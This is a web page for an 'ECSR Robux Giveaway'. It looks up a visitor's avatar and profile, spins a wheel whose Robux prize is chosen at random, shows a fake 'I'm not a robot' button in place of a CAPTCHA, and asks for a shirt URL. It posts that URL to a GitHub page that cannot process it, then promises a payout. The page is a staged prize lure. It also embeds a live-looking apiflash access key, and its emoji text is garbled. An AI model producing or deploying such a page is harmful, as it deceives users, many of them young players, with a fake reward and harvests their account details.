<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ECSR Robux Giveaway</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f5f5f5;
      text-align: center;
      padding: 40px;
    }
    h1 {
      color: #333;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      font-size: 16px;
    }
    button {
      cursor: pointer;
    }
    .section {
      margin-top: 30px;
      display: none;
    }
    #avatar img, #profileImg img {
      border-radius: 10px;
      margin-top: 10px;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>

  <h1>ECSR Robux Giveaway</h1>

  <input type="text" id="userId" placeholder="Enter ECSR User ID">
  <button onclick="verifyUser()">Check</button>

  <div class="section" id="avatar"></div>
  <div class="section" id="profileImg"></div>

  <div class="section" id="confirm">
    <p>Is this you?</p>
    <button onclick="proceed()">Yes</button>
    <button onclick="reset()">No</button>
  </div>

  <div class="section" id="wheel">
    <p>Spin the wheel!</p>
    <button onclick="spinWheel()">ðŸŽ¡ SPIN</button>
  </div>

  <div class="section" id="reward"></div>

  <div class="section" id="captchaSection">
    <p>Complete CAPTCHA to continue:</p>
    <!-- Replace with real CAPTCHA widget -->
    <button onclick="captchaPassed()">âœ… I'm not a robot</button>
  </div>

  <div class="section" id="shirtSection">
    <p>Enter your shirt URL to claim your Robux:</p>
    <input type="text" id="shirtUrl" placeholder="https://ecsr.io/shirt/...">
    <button onclick="submitClaim()">Submit</button>
  </div>

  <script>
    let userId = '';
    let rewardAmount = 0;

    function verifyUser() {
      userId = document.getElementById('userId').value.trim();
      if (!userId) return alert("Please enter a valid user ID.");

      const avatarUrl = `https://ecsr.io/apisite/thumbnails/v1/users/avatar-headshot?userIds=${userId}`;

      fetch(avatarUrl)
        .then(res => res.json())
        .then(data => {
          const imagePath = data.data[0]?.imageUrl;
          if (!imagePath) throw new Error("Invalid response");

          const avatarImg = "https://ecsr.io" + imagePath;
          const profileImg = `https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=8&response_type=image`;

          document.getElementById('avatar').innerHTML = `<img src="${avatarImg}" width="120">`;
          document.getElementById('profileImg').innerHTML = `<img src="${profileImg}" width="300">`;

          document.getElementById('avatar').style.display = 'block';
          document.getElementById('profileImg').style.display = 'block';
          document.getElementById('confirm').style.display = 'block';
        })
        .catch(err => {
          alert("User not found or API error.");
          console.error(err);
        });
    }

    function proceed() {
      document.getElementById('confirm').style.display = 'none';
      document.getElementById('wheel').style.display = 'block';
    }

    function reset() {
      window.location.reload();
    }

    function spinWheel() {
      rewardAmount = (Math.floor(Math.random() * 10) + 1) * 10; // 10 - 100
      document.getElementById('reward').innerHTML = `ðŸŽ‰ You won ${rewardAmount} Robux!`;
      document.getElementById('reward').style.display = 'block';
      document.getElementById('captchaSection').style.display = 'block';
    }

    function captchaPassed() {
      document.getElementById('captchaSection').style.display = 'none';
      document.getElementById('shirtSection').style.display = 'block';
    }

    function submitClaim() {
      const shirtUrl = document.getElementById('shirtUrl').value.trim();
      if (!shirtUrl.startsWith("http")) return alert("Enter a valid shirt URL.");

      fetch('https://github.com/Wumpu7/aa/tree/main', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: userId,
          reward: rewardAmount,
          shirtUrl: shirtUrl
        })
      })
      .then(res => res.json())
      .then(() => {
        alert("Your claim has been submitted! Weâ€™ll review and pay out shortly.");
        window.location.reload();
      })
      .catch(() => {
        alert("Error sending claim.");
      });
    }
  </script>

</body>
</html>
